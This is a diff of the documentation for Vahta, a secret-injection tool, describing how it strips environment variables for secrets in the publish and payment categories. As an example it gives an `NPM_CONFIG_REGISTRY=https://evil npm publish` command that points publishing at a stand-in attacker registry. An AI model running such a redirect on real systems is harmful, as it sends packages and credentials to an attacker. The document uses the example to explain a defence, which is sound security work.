@@ -171,7 +171,18 @@ vahta run --secret API_KEY --as API_KEY=SERVICE_TOKEN -- ./deploy.sh
   session.
 - **The command** gets your arguments, working directory and environment, minus
   `LD_PRELOAD`, `LD_AUDIT`, `LD_LIBRARY_PATH`, `DYLD_*` and `VAHTA_*`, plus the
-  secrets. Standard input is relayed, Ctrl-C and termination are forwarded, the
+  secrets. For a secret of the `publish` or `payment` category the environment
+  is cut down further: only the category's `env_keep` list (compiled in:
+  `crates/policy/categories`), the injected variables and `PATH`, `HOME`,
+  `USER`, `LOGNAME`, `LANG`, `LC_*`, `TERM`, `TMPDIR`, `TZ` pass (with several
+  secrets, what every restricted category keeps), so
+  `NPM_CONFIG_REGISTRY=https://evil npm publish` runs without the variable. The
+  run window and the journal list the names that were dropped (never the
+  values), and, for any secret, the arguments beyond the allowed prefix
+  (`cargo publish --manifest-path /elsewhere/Cargo.toml` shows
+  `Extra arguments: --manifest-path /elsewhere/Cargo.toml`). A program's own
+  config files (`.npmrc`, `.cargo/config.toml`) can still redirect it; Vahta
+  does not read them. Standard input is relayed, Ctrl-C and termination are forwarded, the
   exit code passes through, and if `vahta run` is killed the command is ended.
 - **Output** comes back with every value replaced by `***REDACTED(NAME)***`.
   Matches are found even when a value is split across two reads, overlaps another
